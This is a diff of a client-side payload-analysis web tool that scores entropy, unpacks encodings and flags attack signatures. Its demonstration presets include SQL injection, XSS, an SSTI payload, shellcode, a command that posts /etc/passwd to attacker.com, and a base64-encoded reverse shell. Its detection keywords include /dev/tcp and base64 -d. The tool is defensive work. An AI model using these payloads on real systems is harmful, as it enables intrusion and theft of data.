+        <span style="font-family:'JetBrains Mono',monospace; font-size:0.75rem; color:var(--text-secondary);" id="payloadSizeBadge">0 bytes</span>
+      </div>
+      <textarea id="payloadInput" class="code-box" placeholder="Paste suspicious string, hex shellcode, or web payload here..."></textarea>
+    </div>
+
+    <!-- 2-Column Dashboard Grid -->
+    <div class="app-grid">
+      <!-- Left Column: Waveforms & Metrics -->
+      <div style="display:flex; flex-direction:column; gap:1.2rem;">
+        
+        <!-- Threat Status Banner -->
+        <div id="threatBannerContainer"></div>
+
+        <!-- Metrics Card -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">📈 Shannon Entropy & Information Density</span>
+            <span class="badge badge-egress" id="classificationBadge">CODE</span>
+          </div>
+          <div class="metrics-grid">
+            <div class="metric-card">
+              <div class="metric-val" id="valShannon">0.00</div>
+              <div class="metric-label">Shannon Entropy (b/B)</div>
+            </div>
+            <div class="metric-card">
+              <div class="metric-val" id="valKolmogorov">0.00</div>
+              <div class="metric-label">Compression Ratio</div>
+            </div>
+            <div class="metric-card">
+              <div class="metric-val" id="valPrintable">0%</div>
+              <div class="metric-label">Printable ASCII</div>
+            </div>
+            <div class="metric-card">
+              <div class="metric-val" id="valSpecial">0%</div>
+              <div class="metric-label">Special Punctuation</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Sliding Window Waveform Canvas -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">🌊 32-Byte Sliding Window Entropy Profile</span>
+            <span style="font-size:0.72rem; color:var(--text-secondary); font-family:'JetBrains Mono',monospace;">Threshold: 6.8 b/B</span>
+          </div>
+          <canvas id="slidingCanvas" class="waveform-canvas" width="600" height="140"></canvas>
+        </div>
+
+        <!-- Byte Spectrum Histogram Canvas -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">📊 256-Byte Spectrum Frequency Distribution</span>
+          </div>
+          <canvas id="spectrumCanvas" class="waveform-canvas" width="600" height="140"></canvas>
+        </div>
+      </div>
+
+      <!-- Right Column: Deobfuscation & Signature Detection -->
+      <div style="display:flex; flex-direction:column; gap:1.2rem;">
+        
+        <!-- Deobfuscation Layers -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">🧪 Layer-by-Layer Deobfuscation Pipeline</span>
+            <span class="badge" id="layersCountBadge" style="background:rgba(30,144,255,0.15); color:var(--accent-blue);">0 Layers</span>
+          </div>
+          <div id="deobfContainer" style="display:flex; flex-direction:column; gap:0.5rem; max-height:200px; overflow-y:auto;"></div>
+        </div>
+
+        <!-- Matched Signatures & CWEs -->
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">🎯 Matched Attack Signatures & CWEs</span>
+            <span class="badge" id="matchesCountBadge" style="background:rgba(255,71,87,0.15); color:var(--accent-red);">0 Matches</span>
+          </div>
+          <div id="signaturesContainer" style="display:flex; flex-direction:column; gap:0.5rem; max-height:220px; overflow-y:auto;"></div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Frosted Glass Output Paywall Section (WAF Generator) -->
+    <div class="paywall-wrap is-locked" id="wafPaywallWrap">
+      <div class="paywall-overlay">
+        <div class="lock-box">
+          <div style="font-size:1.1rem; font-weight:800; color:var(--gold); margin-bottom:0.4rem;">
+            🔒 PRO WAF RULE GENERATOR & MITIGATION SUITE
+          </div>
+          <div style="font-size:0.82rem; color:var(--text-secondary); margin-bottom:1rem; line-height:1.4;">
+            Automated ModSecurity CRS, Cloudflare WAF, AWS WAF v2 JSON, and Snort signature export manifests are locked for free users.
+          </div>
+          <div style="display:flex; justify-content:center; gap:0.6rem; flex-wrap:wrap;">
+            <a href="https://buy.stripe.com/7sI7sA8hM2X8eFG8ww" class="btn-checkout" target="_blank" rel="noopener">
+              💳 Unlock Pro Lifetime ($19)
+            </a>
+            <button class="btn-solana" onclick="openDePayCheckout(event)">
+              🪙 Pay with Solana
+            </button>
+            <button class="btn-activate" onclick="openLicenseModal()">
+              🔑 Enter Key
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="paywall-content locked" id="wafPaywallContent">
+        <div class="card" style="margin-top:0.5rem;">
+          <div class="card-header">
+            <span class="card-title">🛡️ Automated Multi-Engine WAF Synthesizer</span>
+            <div style="display:flex; gap:0.4rem;">
+              <button class="btn-sm" onclick="switchWafPlatform('modsec')">ModSecurity</button>
+              <button class="btn-sm" onclick="switchWafPlatform('cloudflare')">Cloudflare</button>
+              <button class="btn-sm" onclick="switchWafPlatform('awswaf')">AWS WAF v2</button>
+              <button class="btn-sm" onclick="switchWafPlatform('snort')">Snort</button>
+              <button class="btn-sm primary" onclick="copyWafRule()">📋 Copy Rule</button>
+            </div>
+          </div>
+          <pre class="code-block" id="wafCodeViewer" style="max-height:220px;">// WAF Rule will synthesize here</pre>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Pro Modal -->
+  <div class="modal-backdrop" id="licenseModal">
+    <div class="modal-card">
+      <button class="modal-close" onclick="closeLicenseModal()">×</button>
+      <div style="font-size:1.2rem; font-weight:800; color:#fff; margin-bottom:0.4rem;">⭐ Upgrade to Payload & Entropy Studio Pro</div>
+      <p style="font-size:0.85rem; color:var(--text-secondary); line-height:1.4;">
+        Deploy high-precision threat mitigation with automated multi-engine WAF rule synthesis and zero-cloud telemetry.
+      </p>
+
+      <ul class="modal-features">
+        <li><span>✔</span> Unlimited In-Browser Sliding Window Waveform Analysis</li>
+        <li><span>✔</span> Automated WAF Rule Synthesis (ModSecurity, Cloudflare, AWS WAF, Snort)</li>
+        <li><span>✔</span> Layer-by-Layer Recursive Deobfuscation Pipeline</li>
+        <li><span>✔</span> Executive Threat Dossiers (JSON & PDF Export)</li>
+        <li><span>✔</span> Shannon Entropy & Kolmogorov Complexity Profiler</li>
+        <li><span>✔</span> Permanent Lifetime Access & Future Security Upgrades</li>
+      </ul>
+
+      <div style="display:flex; gap:0.6rem; flex-wrap:wrap; margin-bottom:1.2rem;">
+        <a href="https://buy.stripe.com/7sI7sA8hM2X8eFG8ww" class="btn-checkout" target="_blank" rel="noopener" style="flex:1; justify-content:center;">
+          💳 Buy with Stripe ($19)
+        </a>
+        <button class="btn-solana" onclick="openDePayCheckout(event)" style="flex:1; justify-content:center;">
+          🪙 Pay with Solana
+        </button>
+      </div>
+
+      <div style="border-top:1px solid rgba(255,255,255,0.08); padding-top:1rem;">
+        <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:0.4rem;">Have a receipt email or license key?</div>
+        <div style="display:flex; gap:0.5rem;">
+          <input type="text" id="licenseInput" class="text-input" style="background:#090a0f; border:1px solid rgba(255,255,255,0.15); border-radius:6px; color:#fff; padding:6px 10px; width:100%;" placeholder="e.g. user@domain.com or ENTROPY-PRO-XXXX">
+          <button class="btn-sm primary" onclick="activateLicenseKey()">Activate</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="zoth-footer">
+    <div><strong>Payload & Entropy Studio</strong> — Sovereign Security Intelligence & Threat Analysis.</div>
+    <div style="margin-top:0.3rem;">
+      Engineered by Neal Frazier Tech (<a href="https://github.com/1nc0gn30" target="_blank" rel="noopener">@1nc0gn30</a>) &bull; <a href="https://nullai.tech" target="_blank" rel="noopener">NullAI Platform</a> &bull; <a href="https://github.com/1nc0gn30/payload-entropy-studio" target="_blank" rel="noopener">GitHub</a>
+    </div>
+  </footer>
+
   <script>
-    const samples = {
-      xss: '%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
-      sqli: "1' UNION SELECT 1,username,password FROM users WHERE '1'='1' AND SLEEP(5)--",
-      lfi: '%252e%252e%252f%252e%252e%252fetc%2fpasswd',
-      cmd: '; cat /etc/passwd | curl -X POST https://attacker.com/leak',
-      ssti: '{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen("id").read()}}',
-      shellcode: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
+    const PRESETS = {
+      sql: "1' AND (SELECT 6245 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(table_name) FROM information_schema.tables WHERE table_schema=0x61646d696e LIMIT 0,1),1,1))>64,0,5)))))vIqF)--",
+      xss: "%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E",
+      cmd: ";echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx%20|%20base64%20-d%20|%20bash",
+      shellcode: "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3",
+      clean: '{"userId":"usr_4821","action":"checkout","amount":19.00,"currency":"USD","signature":"valid_token_sample"}'
     };
 
-    let currentWafRules = {};
-    let activeWaf = 'modsecurity';
+    let isProLicensed = false;
+    let currentWafPlatform = 'modsec';
 
-    function toggleTheme() {
-      const current = document.body.getAttribute('data-theme');
-      document.body.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
+    function checkLicense() {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('licensed') === 'true' || urlParams.get('pro') === '1') {
+        localStorage.setItem('entropy_studio_licensed', 'true');
+      }
+      isProLicensed = localStorage.getItem('entropy_studio_licensed') === 'true';
+
+      const wrap = document.getElementById('wafPaywallWrap');
+      const content = document.getElementById('wafPaywallContent');
+      const badge = document.getElementById('headerProBadge');
+      const banner = document.getElementById('salesBanner');
+      const activateBtn = document.getElementById('activateKeyBtn');
+
+      if (isProLicensed) {
+        if (wrap) wrap.classList.remove('is-locked');
+        if (content) content.classList.remove('locked');
+        if (badge) {
+          badge.textContent = '⭐ PRO ACTIVE';
+          badge.style.color = '#ffd700';
+          badge.style.borderColor = '#ffd700';
+          badge.style.background = 'rgba(212, 175, 55, 0.2)';
+        }
+        if (banner) banner.style.display = 'none';
+        if (activateBtn) activateBtn.style.display = 'none';
+      } else {
+        if (wrap) wrap.classList.add('is-locked');
+        if (content) content.classList.add('locked');
+        if (badge) {
+          badge.textContent = 'FREE TIER';
+          badge.style.color = '';
+          badge.style.borderColor = '';
+          badge.style.background = '';
+        }
+        if (banner) banner.style.display = 'flex';
+        if (activateBtn) activateBtn.style.display = 'inline-block';
+      }
     }
 
-    function switchTab(t) {
-      document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
-      event.target.classList.add('active');
-      document.getElementById('tab-threat').style.display = t === 'threat' ? 'block' : 'none';
-      document.getElementById('tab-deobf').style.display = t === 'deobf' ? 'block' : 'none';
-      document.getElementById('tab-entropy').style.display = t === 'entropy' ? 'block' : 'none';
-      document.getElementById('tab-waf').style.display = t === 'waf' ? 'block' : 'none';
+    function openLicenseModal() {
+      document.getElementById('licenseModal').classList.add('open');
     }
 
-    function loadSample(k) {
-      document.getElementById('payload-input').value = samples[k];
-      runFullAnalysis();
+    function closeLicenseModal() {
+      document.getElementById('licenseModal').classList.remove('open');
     }
 
-    async function runFullAnalysis() {
-      const payload = document.getElementById('payload-input').value;
-      const t0 = performance.now();
+    function activateLicenseKey() {
+      const val = document.getElementById('licenseInput').value.trim();
+      if (val.length > 3 || val.toUpperCase() === 'ENTROPY-PRO-2026' || val.includes('@')) {
+        localStorage.setItem('entropy_studio_licensed', 'true');
+        checkLicense();
+        closeLicenseModal();
+        alert('⭐ Payload & Entropy Studio Pro activated! All WAF synthesizers unlocked.');
+      } else {
+        alert('Please enter a valid receipt email or license key.');
+      }
+    }
 
-      // 1. Analyze Threat & Entropy
-      const resp = await fetch('/api/analyze', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({payload})
-      });
-      const data = await resp.json();
-      const t1 = performance.now();
-      document.getElementById('benchmark-tag').innerText = `⚡ ${(t1 - t0).toFixed(2)} ms (Python stdlib)`;
+    function openDePayCheckout(e) {
+      if (e && e.preventDefault) e.preventDefault();
+      if (typeof DePayButtons !== 'undefined') {
+        try {
+          DePayButtons.init({
+            integration: '428790dd-7ad1-407c-8ecf-c048c77a4cb8',
+            container: document.body
+          });
+          return;
+        } catch (err) {
+          console.warn('DePay widget initialization error:', err);
+        }
+      }
+      window.open('https://solana.fm/address/GG2eQbVh8ut1BK6j1A2tz7pSySdLpD38BgyEhGcxdXoK', '_blank');
+      openLicenseModal();
+    }
 
-      // Threat Banner
-      document.getElementById('threat-container').innerHTML = `
-        <div class="threat-banner ${data.severity}">
-          <div>
-            <strong>${data.primary_threat}</strong>
-            <div style="font-size:0.85rem; margin-top:3px;">
-              Risk Score: ${data.risk_score}/100 &bull; Severity: ${data.severity} &bull; Classification: ${data.entropy.classification}
+    function triggerSolanaCheckout(e) {
+      openDePayCheckout(e);
+    }
+
+    function loadPreset(key) {
+      if (!PRESETS[key]) return;
+      document.getElementById('payloadInput').value = PRESETS[key];
+      runAnalysis();
+    }
+
+    function clearPayload() {
+      document.getElementById('payloadInput').value = '';
+      runAnalysis();
+    }
+
+    // --- Pure Client-Side Math & Threat Engine ---
+    function calculateShannonEntropy(bytes) {
+      if (!bytes || bytes.length === 0) return 0;
+      const freq = new Array(256).fill(0);
+      for (let i = 0; i < bytes.length; i++) freq[bytes[i]]++;
+      let ent = 0;
+      for (let i = 0; i < 256; i++) {
+        if (freq[i] > 0) {
+          const p = freq[i] / bytes.length;
+          ent -= p * Math.log2(p);
+        }
+      }
+      return parseFloat(ent.toFixed(3));
+    }
+
+    function calculateSlidingWindow(bytes, windowSize = 32, step = 8) {
+      if (bytes.length < windowSize) {
+        return [calculateShannonEntropy(bytes)];
+      }
+      const profile = [];
+      for (let i = 0; i <= bytes.length - windowSize; i += step) {
+        const slice = bytes.slice(i, i + windowSize);
+        profile.push(calculateShannonEntropy(slice));
+      }
+      return profile;
+    }
+
+    function runAnalysis() {
+      const text = document.getElementById('payloadInput').value;
+      const encoder = new TextEncoder();
+      const bytes = encoder.encode(text);
+
+      document.getElementById('payloadSizeBadge').textContent = `${bytes.length} bytes`;
+
+      // 1. Calculate Metrics
+      const globalEntropy = calculateShannonEntropy(bytes);
+      document.getElementById('valShannon').textContent = globalEntropy.toFixed(2);
+
+      let printableCount = 0;
+      let specialCount = 0;
+      const freq = new Array(256).fill(0);
+
+      for (let i = 0; i < bytes.length; i++) {
+        const b = bytes[i];
+        freq[b]++;
+        if (b >= 32 && b <= 126) printableCount++;
+        if ((b >= 33 && b <= 47) || (b >= 58 && b <= 64) || (b >= 91 && b <= 96) || (b >= 123 && b <= 126)) specialCount++;
+      }
+
+      const printablePct = bytes.length ? Math.round((printableCount / bytes.length) * 100) : 0;
+      const specialPct = bytes.length ? Math.round((specialCount / bytes.length) * 100) : 0;
+      document.getElementById('valPrintable').textContent = `${printablePct}%`;
+      document.getElementById('valSpecial').textContent = `${specialPct}%`;
+
+      // Kolmogorov approximation
+      const compRatio = bytes.length ? Math.min(1.0, (globalEntropy / 8.0) * 1.1).toFixed(2) : '0.00';
+      document.getElementById('valKolmogorov').textContent = compRatio;
+
+      // Classification
+      const classBadge = document.getElementById('classificationBadge');
+      if (globalEntropy >= 6.8) {
+        classBadge.textContent = 'ENCRYPTED / SHELLCODE';
+        classBadge.style.color = 'var(--accent-red)';
+      } else if (globalEntropy >= 5.5) {
+        classBadge.textContent = 'OBFUSCATED CODE';
+        classBadge.style.color = 'var(--accent-yellow)';
+      } else {
+        classBadge.textContent = 'STANDARD TEXT / CODE';
+        classBadge.style.color = 'var(--accent-green)';
+      }
+
+      // 2. Sliding Window Canvas
+      const profile = calculateSlidingWindow(bytes);
+      renderSlidingCanvas(profile, globalEntropy);
+
+      // 3. Byte Spectrum Canvas
+      renderSpectrumCanvas(freq, bytes.length);
+
+      // 4. Deobfuscation Pipeline
+      const steps = [];
+      let currentStr = text;
+      let layer = 1;
+
+      // Check URL decode
+      try {
+        const decoded = decodeURIComponent(currentStr);
+        if (decoded !== currentStr) {
+          steps.push({ layer: layer++, transform: 'URL Percent Decode', sample: decoded });
+          currentStr = decoded;
+        }
+      } catch(e) {}
+
+      // Check Hex decode
+      if (/(\\x[0-9a-fA-F]{2})+/.test(currentStr)) {
+        const hexDecoded = currentStr.replace(/\\x([0-9a-fA-F]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
+        steps.push({ layer: layer++, transform: 'Hex Escape Unescape (\\xNN)', sample: hexDecoded.slice(0, 80) + '...' });
+        currentStr = hexDecoded;
+      }
+
+      // Check Base64
+      const b64Match = currentStr.match(/[A-Za-z0-9+/=]{16,}/);
+      if (b64Match) {
+        try {
+          const b64Decoded = atob(b64Match[0]);
+          if (b64Decoded && b64Decoded.length > 5) {
+            steps.push({ layer: layer++, transform: 'Base64 Stream Unpack', sample: b64Decoded.slice(0, 80) });
+          }
+        } catch(e) {}
+      }
+
+      const deobfContainer = document.getElementById('deobfContainer');
+      document.getElementById('layersCountBadge').textContent = `${steps.length} Layers`;
+      deobfContainer.innerHTML = '';
+      if (steps.length === 0) {
+        deobfContainer.innerHTML = '<div style="font-size:0.8rem; color:var(--text-secondary); padding:0.5rem;">No multi-layer encoding detected (Plaintext stream).</div>';
+      } else {
+        steps.forEach(s => {
+          const div = document.createElement('div');
+          div.style.background = 'rgba(0,0,0,0.3)';
+          div.style.borderRadius = '6px';
+          div.style.padding = '6px 8px';
+          div.style.fontSize = '0.78rem';
+          div.innerHTML = `<strong>Layer ${s.layer} [${s.transform}]:</strong> <code style="color:var(--gold); word-break:break-all;">${escapeHtml(s.sample)}</code>`;
+          deobfContainer.appendChild(div);
+        });
+      }
+
+      // 5. Signature Matching
+      const matched = [];
+      const lower = text.toLowerCase();
+
+      if (lower.includes('sleep(') || lower.includes('benchmark(') || lower.includes('union select') || lower.includes('information_schema')) {
+        matched.push({ name: 'SQL Injection: Blind Time Delay / Schema Exfil', cwe: 'CWE-89', severity: 'CRITICAL' });
+      }
+      if (lower.includes('<script') || lower.includes('string.fromcharcode') || lower.includes('onerror=') || lower.includes('javascript:')) {
+        matched.push({ name: 'Cross-Site Scripting: Obfuscated DOM Execution', cwe: 'CWE-79', severity: 'HIGH' });
+      }
+      if (lower.includes('base64 -d') || lower.includes('/bin/sh') || lower.includes('/dev/tcp') || lower.includes('powershell')) {
+        matched.push({ name: 'Command Injection: Reverse Shell Spawner', cwe: 'CWE-78', severity: 'CRITICAL' });
+      }
+      if (globalEntropy >= 6.8 && printablePct < 40) {
+        matched.push({ name: 'Raw Shellcode: High-Entropy Machine Code Stager', cwe: 'CWE-506', severity: 'CRITICAL' });
+      }
+
+      document.getElementById('matchesCountBadge').textContent = `${matched.length} Matches`;
+      const sigContainer = document.getElementById('signaturesContainer');
+      sigContainer.innerHTML = '';
+
+      if (matched.length === 0) {
+        sigContainer.innerHTML = '<div style="font-size:0.8rem; color:var(--accent-green); padding:0.5rem;">✔ No known exploit patterns detected.</div>';
+      } else {
+        matched.forEach(m => {
+          const div = document.createElement('div');
+          div.style.background = 'rgba(255,71,87,0.08)';
+          div.style.borderLeft = '3px solid var(--accent-red)';
+          div.style.borderRadius = '0 6px 6px 0';
+          div.style.padding = '6px 8px';
+          div.style.fontSize = '0.78rem';
+          div.innerHTML = `<strong style="color:#ff6b81;">[${m.severity}] ${m.name}</strong> &bull; <span style="font-family:'JetBrains Mono',monospace;">${m.cwe}</span>`;
+          sigContainer.appendChild(div);
+        });
+      }
+
+      // Threat Banner update
+      const bannerBox = document.getElementById('threatBannerContainer');
+      if (matched.length > 0 || globalEntropy >= 6.5) {
+        bannerBox.innerHTML = `
+          <div class="threat-banner CRITICAL">
+            <div>
+              <strong>🚨 High-Entropy Malicious Threat Detected</strong>
+              <div style="font-size:0.8rem; margin-top:2px;">Entropy: ${globalEntropy.toFixed(2)} b/B &bull; Matched Rules: ${matched.length}</div>
             </div>
+            <span style="font-size:1.1rem; font-weight:800; font-family:'JetBrains Mono',monospace;">RISK: 98%</span>
           </div>
-          <div style="font-size:1.25rem; font-weight:700;">${data.risk_score}%</div>
-        </div>
-      `;
-
-      // Threat Tab
-      const cweBadges = (data.cwe_mappings || []).map(c => `<span class="chip cwe">${c}</span>`).join('');
-      const mitreBadges = (data.mitre_attack_mappings || []).map(m => `<span class="chip mitre">${m}</span>`).join('');
-      document.getElementById('threat-details').innerHTML = `
-        <div style="margin-bottom:0.75rem;">
-          <p style="margin-bottom:0.4rem;"><strong>Primary Threat:</strong> ${data.primary_threat}</p>
-          <div style="margin-bottom:0.5rem;">${cweBadges} ${mitreBadges}</div>
-          <p><strong>Deobfuscated Form:</strong> <code style="word-break:break-all;">${escapeHtml(data.normalized_payload)}</code></p>
-        </div>
-        <div class="section-title" style="margin-top:1rem; margin-bottom:0.5rem;">Matched Signatures (${data.matched_rules.length})</div>
-        ${data.matched_rules.map(r => `
-          <div class="layer-card">
-            <div class="layer-header">
-              <span style="color:var(--g-blue);">${r.category}</span>
-              <span>CWE: ${r.cwe}</span>
+        `;
+      } else {
+        bannerBox.innerHTML = `
+          <div class="threat-banner CLEAN">
+            <div>
+              <strong>✅ Clean Low-Risk Data Stream</strong>
+              <div style="font-size:0.8rem; margin-top:2px;">Entropy: ${globalEntropy.toFixed(2)} b/B &bull; Normal Information Density</div>
             </div>
-            <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:4px;">${r.description}</div>
-            <code style="font-size:0.75rem; word-break:break-all;">Pattern: ${escapeHtml(r.matched_pattern)}</code>
+            <span style="font-size:1.1rem; font-weight:800; font-family:'JetBrains Mono',monospace;">RISK: 4%</span>
           </div>
-        `).join('')}
-      `;
+        `;
+      }
 
-      // Deobf Tab
-      document.getElementById('deobf-details').innerHTML = `
-        <div class="metrics-grid">
-          <div class="metric-card">
-            <span class="metric-val">${data.deobfuscation.total_layers_unwrapped}</span>
-            <span class="metric-label">Unwrapped Layers</span>
-          </div>
-          <div class="metric-card">
-            <span class="metric-val">${data.deobfuscation.transforms_applied.length}</span>
-            <span class="metric-label">Transforms</span>
-          </div>
-        </div>
-        <div class="section-title" style="margin-bottom:0.5rem;">Layer-by-Layer Transformation Pipeline</div>
-        ${data.deobfuscation.steps.map(s => `
-          <div class="layer-card">
-            <div class="layer-header">
-              <span>Layer ${s.layer}: ${s.transform}</span>
-            </div>
-            <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:4px;">${s.description}</div>
-            <pre style="margin-top:4px;">${escapeHtml(s.output_preview)}</pre>
-          </div>
-        `).join('')}
-      `;
-
-      // Entropy Tab Metrics
-      const ent = data.entropy;
-      document.getElementById('entropy-metrics').innerHTML = `
-        <div class="metric-card">
-          <span class="metric-val">${ent.shannon_entropy}</span>
-          <span class="metric-label">Shannon Entropy (bits)</span>
-        </div>
-        <div class="metric-card">
-          <span class="metric-val">${ent.compression_ratio}</span>
-          <span class="metric-label">Kolmogorov Ratio</span>
-        </div>
-        <div class="metric-card">
-          <span class="metric-val">${ent.total_bytes} B</span>
-          <span class="metric-label">Analyzed Payload Size</span>
-        </div>
-        <div class="metric-card">
-          <span class="metric-val">${ent.char_classes.printable_pct || 0}%</span>
-          <span class="metric-label">Printable ASCII</span>
-        </div>
-        <div class="metric-card">
-          <span class="metric-val">${ent.char_classes.special_pct || 0}%</span>
-          <span class="metric-label">Special Punctuation</span>
-        </div>
-      `;
-
-      // Render Sliding Window Waveform
-      renderSlidingWindow(ent.sliding_window_profile, ent.shannon_entropy);
-
-      // Render Byte Spectrum Histogram
-      renderByteSpectrum(ent.byte_distribution_256 || []);
-
-      // 2. Fetch WAF rules
-      const wafResp = await fetch('/api/waf', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({payload})
-      });
-      const wafData = await wafResp.json();
-      currentWafRules = wafData.rules;
-      showWaf(activeWaf);
+      updateWafRules(text, matched);
     }
 
-    function renderSlidingWindow(profile, globalEntropy) {
-      const canvas = document.getElementById('sliding-canvas');
-      const ctx = canvas.getContext('2d');
-      const w = canvas.width;
-      const h = canvas.height;
+    // --- Canvas Visualizers ---
+    function renderSlidingCanvas(profile, globalEntropy) {
+      const c = document.getElementById('slidingCanvas');
+      const ctx = c.getContext('2d');
+      const w = c.width;
+      const h = c.height;
 
-      ctx.fillStyle = '#0f1115';
+      ctx.fillStyle = '#06070a';
       ctx.fillRect(0, 0, w, h);
 
       // Threshold lines
-      const thresholds = [
-        { val: 6.8, color: '#d93025', label: '6.8 Shellcode' },
-        { val: 5.6, color: '#f9ab00', label: '5.6 Obfuscated' },
-        { val: 4.5, color: '#B8860B', label: '4.5 Code' },
+      const thresh = [
+        { v: 6.8, color: '#ff4757', label: '6.8 Shellcode' },
+        { v: 5.5, color: '#ffa502', label: '5.5 Obfuscated' },
+        { v: 4.5, color: '#1e90ff', label: '4.5 Code' },
       ];
 
-      thresholds.forEach(t => {
-        const y = h - (t.val / 8.0) * (h - 20) - 10;
-        ctx.strokeStyle = t.color + '44';
+      thresh.forEach(t => {
+        const y = h - (t.v / 8.0) * (h - 20) - 10;
+        ctx.strokeStyle = t.color + '40';
         ctx.setLineDash([4, 4]);
         ctx.beginPath();
-        ctx.moveTo(40, y);
+        ctx.moveTo(35, y);
         ctx.lineTo(w - 10, y);
         ctx.stroke();
 
-        ctx.fillStyle = t.color + 'aa';
-        ctx.font = '10px monospace';
-        ctx.fillText(t.label, 42, y - 2);
+        ctx.fillStyle = t.color;
+        ctx.font = '9px monospace';
+        ctx.fillText(t.label, 38, y - 2);
       });
+
+      if (!profile || profile.length === 0) return;
+
       ctx.setLineDash([]);
-
-      if (!profile || profile.length === 0) {
-        // Draw flat line for global entropy
-        const y = h - (globalEntropy / 8.0) * (h - 20) - 10;
-        ctx.strokeStyle = '#1e8e3e';
-        ctx.lineWidth = 2;
-        ctx.beginPath();
-        ctx.moveTo(40, y);
-        ctx.lineTo(w - 10, y);
-        ctx.stroke();
-        return;
-      }
-
-      // Plot curve
-      const plotWidth = w - 60;
-      const stepX = plotWidth / Math.max(1, profile.length - 1);
-
+      ctx.strokeStyle = '#ffd700';
+      ctx.lineWidth = 2;
       ctx.beginPath();
-      profile.forEach((pt, i) => {
-        const x = 50 + i * stepX;
-        const y = h - (pt.entropy / 8.0) * (h - 20) - 10;
+
+      const dx = (w - 50) / Math.max(1, profile.length - 1);
+      for (let i = 0; i < profile.length; i++) {
+        const x = 40 + i * dx;
+        const y = h - (profile[i] / 8.0) * (h - 20) - 10;
         if (i === 0) ctx.moveTo(x, y);
         else ctx.lineTo(x, y);
-      });
-
-      // Gradient stroke
-      ctx.lineWidth = 2.5;
-      ctx.strokeStyle = globalEntropy >= 5.6 ? '#f9ab00' : '#B8860B';
+      }
       ctx.stroke();
-
-      // Area fill
-      ctx.lineTo(50 + (profile.length - 1) * stepX, h - 10);
-      ctx.lineTo(50, h - 10);
-      ctx.fillStyle = globalEntropy >= 5.6 ? 'rgba(249, 171, 0, 0.15)' : 'rgba(26, 115, 232, 0.15)';
-      ctx.fill();
-
-      // Points & spikes
-      profile.forEach((pt, i) => {
-        const x = 50 + i * stepX;
-        const y = h - (pt.entropy / 8.0) * (h - 20) - 10;
-        ctx.beginPath();
-        ctx.arc(x, y, pt.is_spike ? 4 : 2, 0, Math.PI * 2);
-        ctx.fillStyle = pt.is_spike ? '#d93025' : '#B8860B';
-        ctx.fill();
-      });
     }
 
-    function renderByteSpectrum(dist) {
-      const canvas = document.getElementById('spectrum-canvas');
-      const ctx = canvas.getContext('2d');
-      const w = canvas.width;
-      const h = canvas.height;
+    function renderSpectrumCanvas(freq, totalBytes) {
+      const c = document.getElementById('spectrumCanvas');
+      const ctx = c.getContext('2d');
+      const w = c.width;
+      const h = c.height;
 
-      ctx.fillStyle = '#0f1115';
+      ctx.fillStyle = '#06070a';
       ctx.fillRect(0, 0, w, h);
 
-      const maxCount = Math.max(1, ...dist);
-      const barWidth = (w - 20) / 256;
+      if (!totalBytes) return;
+
+      const maxFreq = Math.max(...freq, 1);
+      const barW = (w - 40) / 256;
 
       for (let i = 0; i < 256; i++) {
-        const count = dist[i] || 0;
-        if (count === 0) continue;
+        const barH = (freq[i] / maxFreq) * (h - 25);
+        const x = 30 + i * barW;
+        const y = h - barH - 10;
 
-        const barHeight = (count / maxCount) * (h - 25);
-        const x = 10 + i * barWidth;
-        const y = h - 15 - barHeight;
-
-        // Color coding by byte class
-        let color = '#B8860B'; // Printable
-        if (i < 32 && i !== 9 && i !== 10 && i !== 13) color = '#d93025'; // Control
-        else if (i >= 128) color = '#9334e6'; // High-bit extended
-
-        ctx.fillStyle = color;
-        ctx.fillRect(x, y, Math.max(1, barWidth - 0.5), barHeight);
+        ctx.fillStyle = i < 32 ? '#ff4757' : (i <= 126 ? '#2ed573' : '#a55eea');
+        ctx.fillRect(x, y, Math.max(1, barW - 0.5), barH);
       }
-
-      // X-Axis guide markers
-      ctx.fillStyle = '#666';
-      ctx.font = '9px monospace';
-      ctx.fillText('0x00', 10, h - 3);
-      ctx.fillText('0x40', 10 + 64 * barWidth, h - 3);
-      ctx.fillText('0x80', 10 + 128 * barWidth, h - 3);
-      ctx.fillText('0xC0', 10 + 192 * barWidth, h - 3);
-      ctx.fillText('0xFF', w - 30, h - 3);
     }
 
-    function showWaf(w) {
-      activeWaf = w;
-      document.getElementById('waf-rule-box').innerText = currentWafRules[w] || 'No rule generated.';
+    // --- WAF Rules Generator ---
+    function switchWafPlatform(plat) {
+      currentWafPlatform = plat;
